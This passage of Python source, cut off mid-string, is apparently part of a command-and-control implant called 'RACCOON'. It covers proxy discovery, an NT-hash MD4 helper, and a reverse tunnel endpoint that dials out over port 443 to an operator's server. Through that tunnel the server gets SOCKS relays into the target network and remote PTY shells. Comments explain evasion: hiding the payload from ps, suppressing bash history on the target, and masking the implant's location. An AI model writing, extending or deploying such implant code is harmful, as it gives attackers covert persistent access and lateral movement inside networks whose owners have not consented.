
    @staticmethod
    def _md4(data: bytes) -> bytes:
        """Pure-Python MD4 (needed for NT hash, not available in hashlib)."""
        def _rl(x, n):
            return ((x << n) | (x >> (32 - n))) & 0xFFFFFFFF
        def _r1(a, b, c, d, x, s):
            return _rl((a + ((b & c) | (~b & d)) + x) & 0xFFFFFFFF, s)
        def _r2(a, b, c, d, x, s):
            return _rl((a + ((b & c) | (b & d) | (c & d)) + x + 0x5A827999) & 0xFFFFFFFF, s)
        def _r3(a, b, c, d, x, s):
            return _rl((a + (b ^ c ^ d) + x + 0x6ED9EBA1) & 0xFFFFFFFF, s)

        length = len(data)
        pad_len = (56 - (length + 1) % 64 + 64) % 64
        padded = data + b"\x80" + b"\x00" * pad_len + struct.pack("<Q", length * 8)

        st = [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476]
        for i in range(0, len(padded), 64):
            x = struct.unpack_from("<16I", padded, i)
            a, b, c, d = st
            for j in range(16):
                a, b, c, d = d, _r1(a, b, c, d, x[j], [3,7,11,19][j%4]), b, c
            for j in range(16):
                idx = [0,4,8,12,1,5,9,13,2,6,10,14,3,7,11,15][j]
                a, b, c, d = d, _r2(a, b, c, d, x[idx], [3,5,9,13][j%4]), b, c
            for j in range(16):
                idx = [0,8,4,12,2,10,6,14,1,9,5,13,3,11,7,15][j]
                a, b, c, d = d, _r3(a, b, c, d, x[idx], [3,9,11,15][j%4]), b, c
            st = [(st[0]+a) & 0xFFFFFFFF, (st[1]+b) & 0xFFFFFFFF,
                  (st[2]+c) & 0xFFFFFFFF, (st[3]+d) & 0xFFFFFFFF]
        return struct.pack("<4I", *st)


# ── Proxy discovery ──

class ProxyDiscovery:
    """Discovers HTTP/HTTPS proxies from environment, system settings, PAC/WPAD, and px."""

    def __init__(self):
        self._discovered: list[dict] = []
        self._active_proxy: Optional[dict] = None

    def discover_all(self) -> list[dict]:
        self._discovered = []
        self._detect_px_proxy()
        self._detect_env_proxy()
        self._detect_system_proxy()
        self._detect_wpad()
        seen = set()
        unique = []
        for p in self._discovered:
            key = p.get("url", "")
            if key and key not in seen:
                seen.add(key)
                unique.append(p)
        self._discovered = unique
        return self._discovered

    @property
    def proxies(self) -> list[dict]:
        return self._discovered

    @property
    def active(self) -> Optional[dict]:
        return self._active_proxy

    def get_urllib_proxies(self) -> Optional[dict]:
        if not self._active_proxy:
            return None
        url = self._active_proxy["url"]
        return {"http": url, "https": url}

    def select_working(self, test_url: str, timeout: float = 10) -> Optional[dict]:
        for proxy in self._discovered:
            try:
                proxy_handler = urllib.request.ProxyHandler({
                    "http": proxy["url"], "https": proxy["url"],
                })
                ssl_ctx = ssl.create_default_context()
                ssl_ctx.check_hostname = False
                ssl_ctx.verify_mode = ssl.CERT_NONE
                opener = urllib.request.build_opener(
                    proxy_handler,
                    urllib.request.HTTPSHandler(context=ssl_ctx),
                )
                req = urllib.request.Request(test_url, method="HEAD")
                resp = opener.open(req, timeout=timeout)
                if resp.getcode() < 500:
                    self._active_proxy = proxy
                    logger.info("Proxy working: %s (%s)", proxy["url"], proxy["source"])
                    return proxy
            except urllib.error.HTTPError as e:
                if e.code < 500:
                    self._active_proxy = proxy
                    logger.info("Proxy working: %s (%s)", proxy["url"], proxy["source"])
                    return proxy
            except Exception:
                logger.debug("Proxy failed: %s", proxy["url"])
        self._active_proxy = None
        return None

    def _detect_px_proxy(self):
        for port in (3128, 8080, 8888):
            s = None
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect(("127.0.0.1", port))
                self._discovered.append({
                    "url": f"http://127.0.0.1:{port}",
                    "source": f"px-proxy (localhost:{port})",
                    "auth": "ntlm-passthrough",
                })
            except Exception:
                pass
            finally:
                if s:
                    try:
                        s.close()
                    except Exception:
                        pass

    def _detect_env_proxy(self):
        for var in ("HTTPS_PROXY", "https_proxy", "HTTP_PROXY", "http_proxy",
                     "ALL_PROXY", "all_proxy"):
            val = os.environ.get(var, "").strip()
            if val:
                if not val.startswith(("http://", "https://", "socks")):
                    val = "http://" + val
                self._discovered.append({
                    "url": val,
                    "source": f"env:{var}",
                    "auth": "from-url" if "@" in val else "none",
                })

    def _detect_system_proxy(self):
        if platform.system() == "Windows":
            self._detect_windows_proxy()
        elif platform.system() == "Darwin":
            self._detect_macos_proxy()
        else:
            self._detect_linux_proxy()

    def _detect_windows_proxy(self):
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                r"Software\Microsoft\Windows\CurrentVersion\Internet Settings")
            enabled, _ = winreg.QueryValueEx(key, "ProxyEnable")
            if enabled:
                server, _ = winreg.QueryValueEx(key, "ProxyServer")
                if server:
                    if "=" in server:
                        for part in server.split(";"):
                            if "=" in part:
                                proto, addr = part.split("=", 1)
                                if proto.lower() in ("http", "https"):
                                    url = addr if addr.startswith("http") else f"http://{addr}"
                                    self._discovered.append({
                                        "url": url, "source": "windows-registry",
                                        "auth": "ntlm-possible",
                                    })
                    else:
                        url = server if server.startswith("http") else f"http://{server}"
                        self._discovered.append({
                            "url": url, "source": "windows-registry",
                            "auth": "ntlm-possible",
                        })
            try:
                pac_url, _ = winreg.QueryValueEx(key, "AutoConfigURL")
                if pac_url:
                    self._discovered.append({
                        "url": pac_url, "source": "windows-pac",
                        "auth": "pac", "is_pac": True,
                    })
            except FileNotFoundError:
                pass
            winreg.CloseKey(key)
        except Exception:
            pass

    def _detect_linux_proxy(self):
        try:
            r = subprocess.run(
                ["gsettings", "get", "org.gnome.system.proxy", "mode"],
                capture_output=True, text=True, timeout=3,
            )
            mode = r.stdout.strip().strip("'")
            if mode == "manual":
                for proto in ("http", "https"):
                    host_r = subprocess.run(
                        ["gsettings", "get", f"org.gnome.system.proxy.{proto}", "host"],
                        capture_output=True, text=True, timeout=3,
                    )
                    port_r = subprocess.run(
                        ["gsettings", "get", f"org.gnome.system.proxy.{proto}", "port"],
                        capture_output=True, text=True, timeout=3,
                    )
                    host = host_r.stdout.strip().strip("'")
                    port = port_r.stdout.strip()
                    if host:
                        self._discovered.append({
                            "url": f"http://{host}:{port or '8080'}",
                            "source": f"gnome-{proto}",
                            "auth": "none",
                        })
            elif mode == "auto":
                pac_r = subprocess.run(
                    ["gsettings", "get", "org.gnome.system.proxy", "autoconfig-url"],
                    capture_output=True, text=True, timeout=3,
                )
                pac = pac_r.stdout.strip().strip("'")
                if pac:
                    self._discovered.append({
                        "url": pac, "source": "gnome-pac",
                        "auth": "pac", "is_pac": True,
                    })
        except Exception:
            pass

    def _detect_macos_proxy(self):
        try:
            r = subprocess.run(
                ["networksetup", "-getwebproxy", "Wi-Fi"],
                capture_output=True, text=True, timeout=5,
            )
            info = {}
            for line in r.stdout.splitlines():
                if ":" in line:
                    k, v = line.split(":", 1)
                    info[k.strip().lower()] = v.strip()
            if info.get("enabled") == "Yes":
                host = info.get("server", "")
                port = info.get("port", "8080")
                if host:
                    self._discovered.append({
                        "url": f"http://{host}:{port}",
                        "source": "macos-networksetup",
                        "auth": "none",
                    })
        except Exception:
            pass

    def _detect_wpad(self):
        try:
            addr = socket.gethostbyname("wpad")
            if addr:
                wpad_url = f"http://{addr}/wpad.dat"
                self._discovered.append({
                    "url": wpad_url, "source": "wpad-dns",
                    "auth": "wpad", "is_pac": True,
                })
        except Exception:
            pass
        try:
            fqdn = socket.getfqdn()
            parts = fqdn.split(".")
            if len(parts) > 1:
                domain = ".".join(parts[1:])
                wpad_host = f"wpad.{domain}"
                addr = socket.gethostbyname(wpad_host)
                if addr:
                    wpad_url = f"http://{addr}/wpad.dat"
                    self._discovered.append({
                        "url": wpad_url, "source": f"wpad-domain ({domain})",
                        "auth": "wpad", "is_pac": True,
                    })
        except Exception:
            pass

    def summary(self) -> str:
        if not self._discovered:
            return "No proxies discovered — using direct connection"
        lines = [f"Discovered {len(self._discovered)} proxy candidate(s):"]
        for i, p in enumerate(self._discovered):
            active = " [ACTIVE]" if p == self._active_proxy else ""
            lines.append(f"  [{i+1}] {p['url']} ({p['source']}, auth={p.get('auth','?')}){active}")
        return "\n".join(lines)


# ── The tunnel endpoint ──
#
# The far end of the tunnel: it connects out, holds one command channel
# open, and on request opens further connections that each proxy one TCP
# stream into its own network. `software/c2/tunnel/server.py` is the other
# half and the authority on the protocol; the shape, briefly:
#
#   * one connection to one port, carrying a Noise `NKpsk0` handshake
#     whose first payload is a `HELLO` -- that connection is the command
#     channel the server holds;
#   * an `OPEN_RELAY(port, token)` down it per session the operator opens;
#   * a **second connection to the same port** whose first payload is a
#     `RELAY(token)`, which the server splices to the operator's SOCKS
#     client.
#
# One port for both, because the usual way out of a target network is an
# HTTP `CONNECT` proxy that permits 443 and nothing else: Squid ships
# `acl SSL_ports port 443` with `http_access deny CONNECT !SSL_ports`, so
# a design that dialled back to a fresh high port per session could not
# form a tunnel at all from most hosts. The 32-byte token does that job
# cryptographically rather than by arrival order, and needs no second
# destination port.
#
# **Getting out is tried in order: a configured proxy, then
# `ProxyDiscovery`, then direct.** Most hosts this runs on have no other
# way out, so a bare `socket.connect((ip, 443))` would reach nothing at
# all from them -- which is why the proxy path is the first one tried and
# not a fallback. When a proxy is used this writes its own
# `CONNECT <server>:<port>` and then speaks Noise over the tunnelled
# stream, because what follows is not HTTP and urllib would own the
# socket. `_NtlmProxyRelay` is a *local* CONNECT proxy that handles NTLM
# against an upstream, so a build configured for NTLM dials
# `127.0.0.1:<its port>` and writes an ordinary CONNECT to it.
#
# Three sharp edges in the layers below, handled here because this is the
# caller they defer to:
#
#   * **`NoiseSession.decrypt` does not retire the session on an
#     authentication failure.** Noise §5.1 says a session must be
#     abandoned after a DECRYPT failure; that class leaves the policy to
#     its caller, so a `ValueError` out of `decrypt` closes the
#     connection here.
#   * **`read_frame` cannot tell an orderly teardown from a malformed
#     peer.** A clean EOF between frames raises `ValueError` just as a
#     truncated frame does, and a stall past the socket timeout raises
#     `socket.timeout`, which is an `OSError`. `_bytes_waiting` moves the
#     distinction into the socket API -- one `MSG_PEEK`, where `b""` is a
#     FIN with nothing behind it -- and it is used in the two places the
#     difference changes what is done: the command loop, where a FIN is an
#     ordinary reconnect and a bad frame is worth a warning, and the
#     relay's return direction, for the same reason. Where it changes
#     nothing -- reading the one SOCKS request a relay is owed -- it is not
#     used, and the comment there says so.
#   * **`write_frame`'s single `sendall` does not make concurrent writes
#     safe**; it loops over partial sends and releases the GIL. The
#     command channel has two writers, the command loop's PONG and the
#     keep-alive thread's PING, so every write to it goes through
#     `_TunnelChannel.send` and its lock -- and the lock covers `encrypt`
#     too, because the nonce it advances has to be ordered with the frame
#     it belongs to. A relay needs no lock and has an invariant instead:
#     exactly one thread writes each of its two sockets, which the bridge
#     documents.
#
# Keep-alive is `MSG_PING` / `MSG_PONG` and not a zero-valued port: the
# frame layer refuses an empty frame, which is the bytes `00 00`, at both
# ends, so a keep-alive encoded that way could not be sent or read here.

# How long the command loop blocks in a read before it looks at the stop
# flag again. Bounded so that `stop` does not wait out an idle timeout,
# and so the loop does not depend on a closed socket waking a blocked
# `recv`, which is not reliable on every platform.
_CONTROL_POLL = 1.0

# Bounds on the keep-alive tick, as on the server: the floor keeps a test
# with a 100 ms interval honest, and the ceiling bounds how late a PING
# can be whatever the configured interval is.
_KEEPALIVE_TICK_FLOOR = 0.02
_KEEPALIVE_TICK_CEILING = 1.0

_DEFAULT_KEEPALIVE = 30.0
_DEFAULT_CONNECT_TIMEOUT = 30.0

# The reconnect backoff, the shape `Beacon._backoff_sleep` already uses:
# a base delay, 1.5 per consecutive failure, a ceiling, and up to 20%
# jitter on top. A dropped command channel is an ordinary event -- a
# server restart, a proxy recycling an idle tunnel -- so the endpoint
# reconnects rather than exiting, and the module constants are what a test
# moves to avoid waiting out a real delay.
_TUNNEL_RETRY_BASE = 5.0
_TUNNEL_RETRY_CEILING = 300.0

# One read fills at most one frame: the plaintext ceiling of a Noise
# message, so nothing has to be split twice.
_TUNNEL_CHUNK = MAX_PAYLOAD_LEN

# How long a thread is waited for at teardown. Both directions of a bridge
# are unparked by a shutdown rather than left to notice on their own, so
# this bounds a pathology and not the normal path.
_TUNNEL_JOIN_TIMEOUT = 5.0

# Guards on a proxy's CONNECT response, the same two `_NtlmProxyRelay`
# has: a broken or hostile proxy must not be able to make this allocate
# without bound while parsing a reply.
_PROXY_MAX_LINE = 8192
_PROXY_MAX_HEADERS = 100

# How the beacon tells a child it is the tunnel and not another beacon.
#
# An environment variable and not an argument, for two reasons. The child
# is started as `python3 -` with its source on stdin, so there is no
# command line left to carry a flag -- which is the whole point of that
# form, since a quarter of a megabyte of payload in `ps` and
# `/proc/<pid>/cmdline` is readable by every user on the host and is
# exactly the kind of thing a fleet gets enumerated by.
# And a variable is not in `ps` output at all, where an argument would be.
#
# The generated config block reads this name rather than repeating the
# string: the parent and the child are the same file, and the two ends of
# an agreement written twice are the two ends that drift.
_TUNNEL_MODE_ENV = "RACCOON_TUNNEL_MODE"

# Which implant raised this tunnel child, handed down by the beacon.
#
# The generated config block cannot carry it. An implant's id is minted
# when the beacon object is built, on the target, and the block is written
# by the generator long before any beacon exists -- so there is no value to
# put in `c2.tunnel.implant_id` at generation time, and no generated block
# emits the key at all. The child is the only process that talks to the
# tunnel server and the beacon is the only one that knows who it is, so
# the one place the two can meet is between them. The fleet is keyed on
# this id, and an endpoint that does not announce it matches no agent: it
# is shown as started from a unit, unmanageable from the panel, and the
# operator shell refuses to attach to a shell port that is plainly open.
#
# Only a fallback. Nothing today puts `c2.tunnel.implant_id` in a config
# but a hand-built dict: the generator does not emit it, and
# `tunnel_config_from_yaml` drops it. Were a config to carry one, though,
# it is somebody's statement about this endpoint's identity, where the
# variable is a value a parent filled in, so the config keeps precedence
# for whoever builds it. A beacon-spawned child has no such key, and for
# it the variable is the only source.
_TUNNEL_IMPLANT_ENV = "RACCOON_TUNNEL_IMPLANT_ID"

# Where the endpoint's PSK comes from on a host configured by file rather
# than by a generated config block.
#
# Not from `configs/raccoon.yaml`, following `RACCOON_LISTENER_TOKEN`: that
# file is in git, and under `NKpsk0` this value plus the server's public
# key is the whole credential. `tunnel_config_from_yaml` refuses a `psk`
# key in the file and names this variable instead;
# `services/raccoon-tunnel.service` supplies it through an
# `EnvironmentFile`, which unlike a unit file is not world-readable.
_TUNNEL_PSK_ENV = "RACCOON_TUNNEL_PSK"

# How long a terminated tunnel child is given to go before it is killed.
# A child blocked in an uninterruptible syscall is exactly the pathology
# running the endpoint in its own process exists to contain, so the wait
# is bounded and the second signal is not negotiable.
_TUNNEL_CHILD_STOP_TIMEOUT = 5.0

# How long the child is given to read the source off its stdin. The
# interpreter drains stdin to EOF before it compiles a line, so a few
# hundred kilobytes is milliseconds and this bound is never reached on
# the real path. It exists because the pipe buffer is around 64 KB and a
# child that reads nothing -- `sys.executable` pointing at an embedded
# interpreter or a frozen host application rather than at python -- would
# otherwise block the beacon's own thread for ever in the write. The
# beacon is the access and the tunnel is the convenience; the convenience
# does not get to hang the access.
_TUNNEL_SOURCE_TIMEOUT = 30.0

# Which RFC 1928 reply code each failure to reach a target becomes.
# Explicit, because an operator's tool prints this code directly and a
# wrong one sends somebody debugging the wrong layer: `0x05` has them
# looking at the service, `0x03` at the route. Anything unmapped is
# `REPLY_GENERAL_FAILURE`, which says only that it did not work.
_SOCKS_REPLY_FOR_ERRNO = {
    errno.ECONNREFUSED: REPLY_CONNECTION_REFUSED,
    # An RST in answer to a SYN is what a refusal is.
    errno.ECONNRESET: REPLY_CONNECTION_REFUSED,
    errno.ENETUNREACH: REPLY_NETWORK_UNREACHABLE,
    errno.ENETDOWN: REPLY_NETWORK_UNREACHABLE,
    errno.ENETRESET: REPLY_NETWORK_UNREACHABLE,
    errno.EHOSTUNREACH: REPLY_HOST_UNREACHABLE,
    errno.EHOSTDOWN: REPLY_HOST_UNREACHABLE,
    errno.ETIMEDOUT: REPLY_TTL_EXPIRED,
    # A local policy refusal -- a sandbox, an SELinux rule -- rather than
    # anything the target did.
    errno.EACCES: REPLY_NOT_ALLOWED,
    errno.EPERM: REPLY_NOT_ALLOWED,
    # No stack for the family the operator asked for, which is the one
    # failure that is about the address type and not the address.
    errno.EAFNOSUPPORT: REPLY_ADDRESS_TYPE_NOT_SUPPORTED,
}


def _socks_reply_for_error(exc: BaseException) -> int:
    """The RFC 1928 reply code for one failure to reach a target.

    `socket.timeout` is checked first because it is an `OSError` whose
    `errno` is `None`, and `socket.gaierror` before the table because its
    `errno` is an `EAI_*` code that collides numerically with the `errno`
    values -- `EAI_NONAME` is 8 on this platform, which the table would
    otherwise read as `ENOEXEC`. A name that does not resolve has no code
    of its own in RFC 1928; host unreachable is the closest, and it is
    what stops an operator blaming the tunnel for a typo.
    """
    if isinstance(exc, socket.timeout):
        return REPLY_TTL_EXPIRED
    if isinstance(exc, socket.gaierror):
        return REPLY_HOST_UNREACHABLE
    return _SOCKS_REPLY_FOR_ERRNO.get(getattr(exc, "errno", None),
                                      REPLY_GENERAL_FAILURE)


def _bound_socks_address(sock: socket.socket) -> Tuple[int, str, int]:
    """`(atyp, address, port)` for RFC 1928 §6's BND.ADDR and BND.PORT.

    The endpoint's own outgoing socket, because that is what the field
    means and because an operator diagnosing a route wants to see which
    interface the connection actually left by, not a canned zero. A
    scoped IPv6 address -- `fe80::1%en0`, which `inet_pton` will not
    take -- falls back to the unspecified address: the bound address is
    informational and a reply that cannot be encoded would cost the
    session.
    """
    try:
        local = sock.getsockname()
        atyp = (ATYP_IPV6 if sock.family == socket.AF_INET6 else ATYP_IPV4)
        address, port = str(local[0]), int(local[1])
        # Encoded and discarded, purely to find out whether it can be.
        _encode_socks_address(atyp, address)
        return atyp, address, port
    except (OSError, ValueError, IndexError, TypeError):
        return ATYP_IPV4, "0.0.0.0", 0


def _bytes_waiting(sock: socket.socket) -> bool:
    """True if a byte is waiting; False on an orderly close.

    `read_frame` reports a clean EOF between frames and a peer that
    vanished mid-frame with the same `ValueError`, so the difference is
    only in the message text. One `MSG_PEEK` moves it into the socket API
    instead: `b""` is a FIN with nothing behind it, a `socket.timeout`
    propagates as a peer that went quiet, and anything else means there
    are bytes in hand -- so a `ValueError` from the `read_frame` that
    follows is a malformed frame and cannot be an orderly teardown.
    """
    return bool(sock.recv(1, socket.MSG_PEEK))


def _shutdown_socket(sock: socket.socket) -> None:
    """Shut a socket down both ways without closing it.

    Without closing, because another thread may still be inside a `recv`
    or a `sendall` on this descriptor: the shutdown is what unparks it,
    and closing the descriptor is left to the one frame that knows every
    thread using it has finished.
    """
    try:
        sock.shutdown(socket.SHUT_RDWR)
    except OSError:
        pass


def _shut_socket(sock: socket.socket) -> None:
    """Drop a socket now, waiting for nothing and raising nothing."""
    _shutdown_socket(sock)
    try:
        sock.close()
    except OSError:
        pass


def _proxy_read_line(sock: socket.socket) -> str:
    """One CRLF-terminated line from a proxy, read a byte at a time.

    A byte at a time because what follows the blank line is a Noise frame
    and must not be read into a buffer this function drops. Bounded at
    `_PROXY_MAX_LINE`, as `_NtlmProxyRelay` bounds its own reads.
    """
    chunks = []
    while len(chunks) < _PROXY_MAX_LINE:
        byte = sock.recv(1)
        if not byte:
            break
        if byte == b"\n":
            break
        if byte != b"\r":
            chunks.append(byte)
    return b"".join(chunks).decode("latin-1")


def _proxy_endpoint(url) -> Optional[Tuple[str, int]]:
    """`(host, port)` of an HTTP proxy URL, or None if it is not one.

    Parsed here rather than handed to urllib because this is also where a
    `socks5://` scheme and a PAC URL are rejected: neither is something a
    `CONNECT` can be written to, and a tunnel that tried would spend a
    whole backoff on a proxy that was never going to answer. Any userinfo
    is dropped -- credentials in a URL are urllib's mechanism, and
    `_NtlmProxyRelay` is this one's path for a proxy that authenticates.
    """
    text = str(url or "").strip()
    if not text:
        return None
    scheme, separator, rest = text.partition("://")
    if separator and scheme.lower() not in ("http", "https"):
        return None
    if not separator:
        scheme, rest = "http", text
    authority = rest.split("/", 1)[0]
    if "@" in authority:
        authority = authority.rsplit("@", 1)[1]
    host, colon, port_text = authority.rpartition(":")
    if not colon:
        host, port_text = authority, ("443" if scheme.lower() == "https"
                                      else "80")
    # A bracketed IPv6 literal, which is how a URL has to write one.
    host = host.strip("[]")
    try:
        port = int(port_text)
    except ValueError:
        return None
    if not host or not 1 <= port <= 0xFFFF:
        return None
    return host, port


def _route_name(route) -> str:
    """How one way out is named in a log line or an error."""
    return "direct" if route is None else "proxy %s:%d" % route


def _tunnel_seconds(value, default: float) -> float:
    """A positive number of seconds from a config field, or `default`."""
    try:
        seconds = float(value)
    except (TypeError, ValueError):
        return default
    return seconds if seconds > 0 else default


def _tunnel_key(value, field: str, what: str) -> bytes:
    """The 32 bytes `value` base64-encodes, or a ValueError naming `field`.

    The messages name the field and the problem and never the value or
    any part of it, following `decode_key`: one of these fields is a PSK,
    which under `NKpsk0` is the whole credential, and an error message is
    the easiest place in a program for a secret to end up. Raised outside
    the except block so the decoder's own error cannot ride along in the
    chain.
    """
    text = value.strip() if isinstance(value, str) else ""
    problem = None
    raw = b""
    if not text:
        problem = ("%s is required: it is %s, %d bytes base64-encoded"
                   % (field, what, _NOISE_KEY_LEN))
    else:
        try:
            # binascii.Error is a ValueError.
            raw = base64.b64decode(text, validate=True)
        except ValueError:
            problem = ("%s is not valid base64: it is %s, %d bytes "
                       "base64-encoded" % (field, what, _NOISE_KEY_LEN))
        else:
            if len(raw) != _NOISE_KEY_LEN:
                problem = ("%s decodes to %d bytes: it is %s, and that is "
                           "exactly %d bytes"
                           % (field, len(raw), what, _NOISE_KEY_LEN))
    if problem:
        raise ValueError(problem)
    return raw


def tunnel_config_problem(config) -> Optional[str]:
    """Why this config cannot run a tunnel endpoint, or None.

    The shape of `beacon_key_problem`: a string naming what is wrong, or
    None. Asked where the config is loaded, so a build whose tunnel block
    is half-filled stops with a reason instead of retrying a connection it
    can never make.

    A tunnel that is absent or disabled is not a problem. Most builds have
    no tunnel, and demanding a PSK of those would break them.
    """
    c2 = config.get("c2") if isinstance(config, dict) else None
    tunnel = c2.get("tunnel") if isinstance(c2, dict) else None
    if not isinstance(tunnel, dict) or not tunnel.get("enabled"):
        return None
    server = tunnel.get("server")
    if not isinstance(server, str) or not server.strip():
        return ("c2.tunnel.server is required: it is the host the endpoint "
                "dials out to, written as the target's network can reach it")
    identity = tunnel.get("identity")
    if not isinstance(identity, str) or not identity.strip():
        return ("c2.tunnel.identity is required: it is the build this PSK "
                "belongs to, and the server refuses a HELLO that claims "
                "another one")
    port = tunnel.get("port")
    if (isinstance(port, bool) or not isinstance(port, int)
            or not 1 <= port <= 0xFFFF):
        return ("c2.tunnel.port must be a port between 1 and 65535: it is "
                "the single port that serves the command channel and every "
                "relay, so that one CONNECT rule is enough to cross a proxy")
    try:
        _tunnel_key(tunnel.get("public_key"), "c2.tunnel.public_key",
                    "the tunnel server's static X25519 public key")
        _tunnel_key(tunnel.get("psk"), "c2.tunnel.psk",
                    "this build's pre-shared key")
    except ValueError as exc:
        return str(exc)
    return None


def tunnel_mode_problem(config) -> Optional[str]:
    """Why this config cannot be *run* as a tunnel endpoint, or None.

    The question `tunnel_config_problem` asks the other way round. That
    one answers None for a config with no tunnel, because most builds
    have none and demanding a PSK of those would break them. Here
    something has been asked to *be* the endpoint -- the child started by
    `Beacon._exec_tunnel`, or the parent about to start it -- so an
    absent, non-dict or disabled block is the problem rather than the
    ordinary case.

    One predicate for both ends on purpose. The parent refuses before it
    spawns, so the operator gets the diagnosis instead of a bare exit
    code; the child refuses in its bootstrap, because a build can be
    launched by hand or by a systemd unit with no parent to have checked.
    Two spellings of the same rule would be the parent and the child
    disagreeing about whether a build has a tunnel.
    """
    c2 = config.get("c2") if isinstance(config, dict) else None
    tunnel = c2.get("tunnel") if isinstance(c2, dict) else None
    if not isinstance(tunnel, dict) or not tunnel.get("enabled"):
        return ("this build carries no enabled c2.tunnel block: there is "
                "no server, port, public_key or psk to dial with, so it "
                "cannot run the tunnel endpoint. Generate the build with "
                "the tunnel enabled.")
    return tunnel_config_problem(config)


# ── A PTY session ──
#
# The second kind of session this endpoint carries. A relay has a target
# socket; a shell session has the master side of a pseudo-terminal, and
# everything else -- the outward dial, the token claim, the Noise framing,
# the two-direction pump -- is the relay's.

# At most four at a time on one endpoint. Each one costs a process, two
# threads and three descriptors, and the host at the far end of this is a
# Pi: the beacon already treats a thread it cannot get as a condition
# rather than a crash, and a cap is the same thought one step earlier.
# The front at the operator's end caps itself at four as well; this is the
# end that enforces it, because this is the end that spends the resources.
_SHELL_MAX_SESSIONS = 4

# How long the shell's process group is given to go on SIGHUP before it
# is killed. A session whose stream has gone has nothing left to
# negotiate with, and an interactive shell exits on a hangup in
# milliseconds; this bounds the one case where something in the group is
# wedged in a syscall.
_SHELL_TERM_GRACE = 2.0

# How long the output direction blocks before it looks at the flag that
# says the session is over.
#
# The one place this file polls. A socket is unparked by shutting it
# down, which is what `_bridge` relies on in both directions; a PTY
# master has no such call, and closing a descriptor another thread is
# parked in a read on is how that number gets reused underneath it. So
# the direction that reads a descriptor rather than a socket waits in
# `select` instead. No byte ever waits for this: `select` returns the
# instant one arrives, and this bounds only how long a teardown takes to
# be noticed.
_SHELL_POLL = 0.2

# The terminal a session claims to be, where it starts, and the two
# shells it will run. `/` and not the install directory: a prompt that
# names where the implant lives is a free finding for whoever is reading
# over the operator's shoulder.
_SHELL_TERM = "xterm-256color"
_SHELL_CWD = "/"
_SHELL_BASH = "/bin/bash"
_SHELL_SH = "/bin/sh"
_SHELL_ZSH = "/bin/zsh"
_DEV_FD = "/dev/fd"

# The names, not the paths, of the login shells a session will run: a
# passwd entry says `/usr/local/bin/bash` as readily as `/bin/bash`
# (Homebrew, Arch, NixOS, a usrmerge `chsh`), and it is the program that
# is wanted, wherever the host keeps it. Derived from the default paths
# so that the two cannot name different shells.
_LOGIN_SHELLS = (os.path.basename(_SHELL_BASH), os.path.basename(_SHELL_ZSH))

# Where `setsid(1)` is, and why the shell is started through it.
#
# A terminal is only half a terminal until it is some session's
# *controlling* terminal. Without that, the line discipline has no
# foreground process group to signal, so `^C` and `^Z` are swallowed and
# the shell runs with job control off -- which would mean an operator
# could start a capture through this session and then have no way to stop
# it, and stopping one is a good part of why the session exists.
#
# Acquiring it has to happen in the child, between `fork` and `exec`:
# `setsid()` and then `TIOCSCTTY` on the slave. Doing that in Python --
# a `preexec_fn`, or `pty.fork`'s `login_tty` -- means running an
# interpreter in the child of a fork in a process holding this many
# threads and locks, which is the documented way to deadlock a child
# before it ever reaches `exec`. `setsid -c` does exactly those two
# calls in a few lines of C instead, and it does not fork when it is not
# already a process-group leader -- which this child never is -- so it
# `exec`s the shell in place. The pid `Popen` returns is therefore the
# session leader and the group id, which is what `killpg` needs, and
# `ps` shows the shell rather than the wrapper.
#
# `-c` is util-linux 2.21 and later, which is everything current. Where
# there is no `setsid` at all -- macOS has none -- the session falls back
# to `Popen(start_new_session=True)`, which gives the child its own
# session and no controlling terminal, and says so in the log.
_SETSID_PATHS = ("/usr/bin/setsid", "/bin/setsid")

# The rcfile a bash session is started on, held in a pipe and never
# written anywhere.
#
# `bash -i` has to read `/etc/bash.bashrc` and `~/.bashrc`, because
# completion for the tools on the target is the whole reason for using
# the target's own shell. Those are also the files most likely to set
# `HISTFILE` on Debian and ParrotOS, so `HISTFILE` in the environment
# would be undone by the very files that have to run. Hence the order
# here: source them, then unset it, then turn history off for the
# session. What this construction holds is exactly that -- no history
# file on the target unless something re-enables one *after* rc
# processing -- and the documentation claims no more than that.
#
# The loader in the middle is there because those two files are *not*
# where `bash-completion` comes from, however reasonable that sounds.
# Measured on Debian 13 with bash-completion 2.16: the direct source in
# `/etc/bash.bashrc` is commented out, the package installs itself
# through `/etc/profile.d/bash_completion.sh`, and only a **login** shell
# reads `/etc/profile`. A real interactive ssh session therefore has flag
# completion and a session here did not -- which left this feature
# offering what a line-mode REPL would have, the thing the design
# rejected it for. Only the loader is read, not the rest of `profile.d`:
# a banner or a locale change from some other script would land in the
# operator's first screen and in the transcript.
#
# Three candidate paths because distributions disagree, each tested for
# readability before it is read -- an unguarded source would be an error
# message in every session on a host without the package -- and the whole
# thing skipped when `/etc/bash.bashrc` already did it.
#
# This file is handed to a bash that has a `/dev/fd` to read it from, and
# only to bash: the user's own login shell when that is a bash --
# `_guard_of` recognises it by basename, so `/opt/homebrew/bin/bash` gets
# it as `/bin/bash` does -- and the fallback bash where there is no login
# shell of theirs to run. A bash on a host with no `/dev/fd` is run as plain
# `-i` with `HISTFILE=/dev/null` in its environment and never sees the
# file, nor its colour; a login shell that is not bash, zsh in practice,
# never sees it either. For a bash login shell this is the stronger history
# guard, not the weaker one, and a prompt that says at a glance this is not
# a local session is as much wanted there as on the fallback.
#
# The colour lines sit above the operator's own files, and that order is
# the whole of their design. Bash with no configuration is monochrome with
# a bare prompt; but a default placed after `~/.bashrc` would overwrite
# the prompt and the colours the operator set up for themselves, and their
# settings are meant to win over anything this code chooses. The prompt
# names the host and the working directory in the interface's own red --
# `--red` in the page's palette, #ff1a1a -- so a glance tells this session
# from a local one.
#
# The prompt goes between the two files, not above both. `/etc/bash.bashrc`
# is the distribution's setting, not the operator's, and Debian and
# ParrotOS set `PS1` in it unconditionally: a prompt placed above it would
# be overwritten before anyone saw it, on the very hosts this is for.
# After it and before `~/.bashrc`, the distribution's prompt gives way to
# ours and the operator's own `.bashrc` still replaces ours. `CLICOLOR`
# and `LSCOLORS` stay at the top: they are for BSD and macOS `ls`, the
# system file does not set them, and they are only given a value when the
# environment has none. `LS_COLORS` is deliberately not mentioned at all:
# GNU `ls` reads it from the environment the host already has, and which
# colours a host wants (`dircolors` and its database) is the host's
# business, not something to guess at here.
_SHELL_RCFILE = ('export CLICOLOR="${CLICOLOR:-1}"\n'
